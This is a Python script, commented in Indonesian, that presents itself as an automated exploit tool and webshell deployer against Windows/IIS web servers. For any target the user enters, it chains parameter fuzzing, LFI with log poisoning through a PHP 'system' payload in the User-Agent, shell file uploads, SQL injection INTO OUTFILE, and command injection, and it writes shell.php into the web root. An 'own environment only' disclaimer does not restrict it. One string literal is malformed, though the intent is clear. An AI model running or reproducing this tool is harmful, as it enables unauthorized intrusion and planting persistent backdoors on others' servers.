#!/usr/bin/env python3
"""
VOID CREATOR v1.0 - Celah Creator & Webshell Deployer
HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI
"""

import os
import sys
import re
import time
import json
import socket
import random
import base64
import urllib.parse
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except:
    os.system("pip install requests")
    import requests

# ========================================
# KONFIGURASI
# ========================================
VERSION = "1.0"
TIMEOUT = 8
MAX_THREADS = 20
VERBOSE = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

PAYLOADS = {
    "lfi_windows": [
        "../../../../windows/win.ini",
        "..\\..\\..\\windows\\win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "c:/windows/win.ini",
        "c:/windows/system32/drivers/etc/hosts"
    ],
    "rce_windows": [
        "& whoami",
        "| whoami",
        "; whoami",
        "& ipconfig",
        "| ipconfig",
        "& dir",
        "| dir"
    ],
    "sqli": [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(3)--"
    ]
}

# ========================================
# UTILITY
# ========================================
def print_banner():
    print("""
   ╔═══════════════════════════════════════════════════╗
   ║     V O I D   C R E A T O R   v1.0               ║
   ║   Exploit Assistant - Create Backdoor Pathway     ║
   ╚═══════════════════════════════════════════════════╝
    """)

def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    return s

def safe_get(url, params=None, timeout=TIMEOUT):
    try:
        return get_session().get(url, params=params, timeout=timeout)
    except Exception as e:
        if VERBOSE: print(f"  [!] GET error: {e}")
        return None

def safe_post(url, data=None, files=None, timeout=TIMEOUT):
    try:
        return get_session().post(url, data=data, files=files, timeout=timeout)
    except Exception as e:
        if VERBOSE: print(f"  [!] POST error: {e}")
        return None

# ========================================
# MODUL 1: PARAMETER FUZZING (Bisakah Ada `file`, `page`, `path`?)
# ========================================
def fuzz_params(target, proto):
    print(f"\n\033[1;33m[+] PARAMETER FUZZING (Mencari parameter tersembunyi)\033[0m")
    base = f"{proto}://{target}"
    common_params = ["file", "page", "path", "dir", "action", "cmd", "exec", "command", "document", "load", "include", "view", "read"]
    found = []
    # Test each param with a harmless value
    for p in common_params:
        url = f"{base}?{p}=test"
        r = safe_get(url)
        if r and r.status_code != 404:
            found.append(p)
            print(f"  [✓] Parameter '{p}' exists (status {r.status_code})")
    if not found:
        print("  [✗] No extra parameters found")
    return found

# ========================================
# MODUL 2: LFI + LOG POISONING (Windows/IIS)
# ========================================
def test_lfi_poison(target, proto, params):
    print(f"\n\033[1;33m[+] LFI & LOG POISONING (Windows/IIS)\033[0m")
    base = f"{proto}://{target}"
    if not params:
        params = ["id", "page", "file"]
    vulnerable_param = None
    # Coba LFI sederhana
    for p in params:
        for payload in PAYLOADS["lfi_windows"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_get(url)
            if r and ("[extensions]" in r.text or "hosts" in r.text):
                print(f"  [✓] LFI found on parameter '{p}' with payload: {payload}")
                vulnerable_param = p
                # Coba log poisoning (IIS log path)
                log_path = "../../../../inetpub/logs/LogFiles/W3SVC1/u_ex" + datetime.now().strftime("%y%m%d") + ".log"
                url2 = f"{base}?{p}={quote_plus(log_path)}"
                r2 = safe_get(url2)
                if r2 and "GET" in r2.text:
                    print(f"  [✓] Log poisoning possible! Injecting PHP code via User-Agent...")
                    # Kita akan inject dengan request khusus
                    headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
                    inject_url = f"{base}?{p}=test"
                    try:
                        requests.get(inject_url, headers=headers, timeout=5)
                        print(f"  [✓] Injection sent. Now access shell via: {base}?{p}={quote_plus(log_path)}&cmd=whoami")
                        return {"param": p, "log_path": log_path}
                    except:
                        pass
                break
    print("  [✗] No LFI / log poisoning found")
    return None

# ========================================
# MODUL 3: UPLOAD ENDPOINT DETECTION & AUTO-UPLOAD
# ========================================
def test_upload(target, proto):
    print(f"\n\033[1;33m[+] UPLOAD ENDPOINT DETECTION\033[0m")
    base = f"{proto}://{target}"
    upload_paths = ["/upload", "/uploads", "/fileupload", "/upload.php", "/upload.aspx", "/admin/upload", "/api/upload"]
    found = []
    for path in upload_paths:
        url = urljoin(base, path)
        # Coba akses GET
        r = safe_get(url)
        if r and r.status_code in [200, 403]:
            print(f"  [✓] Upload endpoint found: {url} (status {r.status_code})")
            # Coba upload shell (IIS support ASP/ASPX)
            shell_code = "<% response.write("TEST") %>" if ".aspx" in path else "<?php echo 'TEST'; ?>"
            files = {'file': ('shell.aspx', shell_code, 'application/octet-stream')}
            r2 = safe_post(url, files=files)
            if r2 and "TEST" in r2.text:
                print(f"  [✓] Upload successful! Shell at {url}")
                return {"url": url, "type": "aspx" if ".aspx" in path else "php"}
            else:
                print(f"  [✗] Upload failed or blocked")
    print("  [✗] No upload endpoint exploitable")
    return None

# ========================================
# MODUL 4: SQLI + OS-SHELL (Simulasi)
# ========================================
def test_sqli_os(target, proto, params):
    print(f"\n\033[1;33m[+] SQLI DEEP TEST + OS-SHELL (Simulasi)\033[0m")
    base = f"{proto}://{target}"
    if not params:
        params = ["id", "page"]
    for p in params:
        for payload in PAYLOADS["sqli"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_get(url)
            if r and ("SQL" in r.text or "mysql" in r.text or "syntax" in r.text):
                print(f"  [✓] SQLi found on '{p}' with payload: {payload}")
                print(f"  [!] Attempting OS-SHELL via INTO OUTFILE (if MySQL)...")
                # Simulasi: kirim payload untuk menulis shell
                shell_payload = f" UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'--"
                url2 = f"{base}?{p}={quote_plus(shell_payload)}"
                r2 = safe_get(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell written! Access: {base}/shell.php?cmd=whoami")
                    return {"param": p, "shell": "C:/inetpub/wwwroot/shell.php"}
                else:
                    print(f"  [✗] INTO OUTFILE failed. Maybe not MySQL or no write permission.")
                break
    print("  [✗] No SQLi found")
    return None

# ========================================
# MODUL 5: RCE DIRECT (Command Injection)
# ========================================
def test_rce(target, proto, params):
    print(f"\n\033[1;33m[+] DIRECT RCE (Command Injection)\033[0m")
    base = f"{proto}://{target}"
    if not params:
        params = ["cmd", "exec", "command", "dir", "action"]
    for p in params:
        for payload in PAYLOADS["rce_windows"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_get(url)
            if r and ("uid=" in r.text or "user" in r.text.lower() or "ipconfig" in r.text or "dir" in r.text):
                print(f"  [✓] RCE found on '{p}' with payload: {payload}")
                print(f"  [!] Deploying webshell via echo...")
                # echo shell ke file
                shell_cmd = f"echo <?php system($_GET[cmd]); ?> > C:\\inetpub\\wwwroot\\shell.php"
                url2 = f"{base}?{p}={quote_plus(shell_cmd)}"
                r2 = safe_get(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell deployed! Access: {base}/shell.php?cmd=whoami")
                    return {"param": p, "shell": "C:/inetpub/wwwroot/shell.php"}
                else:
                    print(f"  [✗] Failed to write shell via echo. Try manual.")
                break
    print("  [✗] No RCE found")
    return None

# ========================================
# MODUL 6: INTEGRATED EXPLOIT FLOW
# ========================================
def run_full(target, proto):
    print("\n" + "="*60)
    print(f"\033[1;36m[+] MENJALANKAN FULL EXPLOIT FLOW UNTUK: {target}\033[0m")
    print("="*60)

    # Step 1: Fuzz parameters
    params = fuzz_params(target, proto)
    if not params:
        params = ["id", "page", "file"]  # fallback

    # Step 2: Coba LFI + Log Poisoning
    lfi_result = test_lfi_poison(target, proto, params)

    # Step 3: Coba Upload
    upload_result = test_upload(target, proto)

    # Step 4: Coba SQLi + OS-Shell
    sqli_result = test_sqli_os(target, proto, params)

    # Step 5: Coba RCE langsung
    rce_result = test_rce(target, proto, params)

    # Report
    print("\n" + "="*60)
    print("\033[1;33m[LAPORAN CELAH & WEBSHELL DEPLOY]\033[0m")
    print("="*60)
    results = {
        "lfi": lfi_result,
        "upload": upload_result,
        "sqli": sqli_result,
        "rce": rce_result
    }
    for k, v in results.items():
        if v:
            print(f"  \033[1;32m[✓] {k.upper()} berhasil dieksploitasi: {v}\033[0m")
        else:
            print(f"  \033[1;31m[✗] {k.upper()} tidak ditemukan/dieksekusi\033[0m")
    print("="*60)
    if any(results.values()):
        print("\033[1;32m[!] Ada celah yang berhasil dieksploitasi! Coba akses shell.php atau log poisoning.\033[0m")
    else:
        print("\033[1;31m[!] Tidak ada celah yang berhasil dieksploitasi. Mungkin target lebih kuat atau WAF aktif.\033[0m")
    return results

# ========================================
# MAIN
# ========================================
def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print_banner()
    print("\033[1;33m[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI\033[0m")
    print(f"Version: {VERSION}\n")

    target = input("\033[1;36m[?] Masukkan target (domain/IP): \033[0m").strip()
    if not target:
        print("[!] Target kosong.")
        return

    proto = "https" if input("[?] Gunakan HTTPS? (y/n): ").lower() == 'y' else "http"
    VERBOSE = input("[?] Tampilkan error? (y/n): ").lower() == 'y'

    print(f"\n[+] Target: {proto}://{target}")
    input("Tekan Enter untuk memulai exploit...")

    run_full(target, proto)

    print("\n[+] Selesai.")
    input("Tekan Enter untuk keluar...")

if __name__ == "__main__":
    main()
